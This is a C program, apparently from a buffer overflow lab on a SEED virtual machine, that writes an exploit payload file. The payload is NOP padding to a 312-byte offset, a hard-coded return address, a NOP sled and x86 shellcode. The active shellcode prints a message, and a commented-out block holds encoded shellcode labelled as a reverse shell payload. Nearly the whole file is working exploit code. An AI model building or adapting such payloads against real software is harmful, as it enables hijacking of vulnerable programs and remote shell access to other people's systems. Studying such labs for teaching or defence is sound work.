#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>

// from the online definition of little endian conversion
uint32_t to_little_endian32(uint32_t value) {
  return ((value & 0xFF) << 24) | ((value & 0xFF00) << 8) |
         ((value >> 8) & 0xFF00) | ((value >> 24) & 0xFF);
}

int main() {
  // reverse shell payload
  /*
  unsigned char buf[] =
      "\xbb\x10\x6f\x60\xac\xdd\xc3\xd9\x74\x24\xf4\x5a\x33\xc9"
      "\xb1\x12\x31\x5a\x12\x03\x5a\x12\x83\xd2\x6b\x82\x59\xe3"
      "\xa8\xb5\x41\x50\x0c\x69\xec\x54\x1b\x6c\x40\x3e\xd6\xef"
      "\x32\xe7\x58\xd0\xf9\x97\xd0\x56\xfb\xff\xe8\xb8\x9c\x5d"
      "\x84\xba\x62\xb0\x09\x32\x83\x02\xd7\x14\x15\x31\xab\x96"
      "\x1c\x54\x06\x18\x4c\xfe\xf7\x36\x02\x96\x6f\x66\xcb\x04"
      "\x19\xf1\xf0\x9a\x8a\x88\x16\xaa\x26\x46\x58";
  */
  unsigned char buf[] = {
      0xeb, 0x19, 0x31, 0xc0, 0x31, 0xdb, 0x31, 0xd2, 0x31, 0xc9, 0xb0,
      0x04, 0xb3, 0x01, 0x59, 0xb2, 0x16, 0xcd, 0x80, 0x31, 0xc0, 0xb0,
      0x01, 0x31, 0xdb, 0xcd, 0x80, 0xe8, 0xe2, 0xff, 0xff, 0xff, 0x54,
      0x68, 0x69, 0x73, 0x20, 0x69, 0x73, 0x20, 0x61, 0x77, 0x65, 0x73,
      0x6f, 0x6d, 0x65, 0x20, 0x73, 0x61, 0x75, 0x63, 0x65, 0x0a};

  int buffer_size = 312;               // pattern_offset result
  uint32_t ebp_addr = 0xffffd528;      // ebp from seed vm
  int shellcode_len = sizeof(buf) - 1; // no null byte
  int nops = 200;

  printf("Shellcode Length [+]: %d\n", shellcode_len);

  uint32_t addr = ebp_addr + 80;
  printf("Return address [+]: %x\n", addr);

  unsigned char *content =
      malloc(buffer_size + sizeof(addr) + nops + shellcode_len);

  // load nops to buffer
  for (int i = 0; i < buffer_size; i++) {
    content[i] = 0x90;
  }

  uint32_t li_addr = to_little_endian32(addr);
  memcpy(&(content[buffer_size]), &addr, sizeof(uint32_t));
  printf("Return address little endian [+]: %x\n", li_addr);

  // load nopsled to shellcode
  for (int i = 0; i < nops; i++) {
    content[i + buffer_size + sizeof(uint32_t)] = 0x90;
  }

  // load shellcode
  for (int i = 0; i < shellcode_len; i++) {
    content[i + buffer_size + sizeof(uint32_t) + nops] = buf[i];
  }

  FILE *file = fopen("payload", "w");
  if (file == NULL) {
    perror("Error openning file");
    return 1;
  }
  int n = write(fileno(file), content,
                buffer_size + sizeof(addr) + nops + shellcode_len);
  printf("Payload written to file payload: %d\n", n);

  return 0;
}
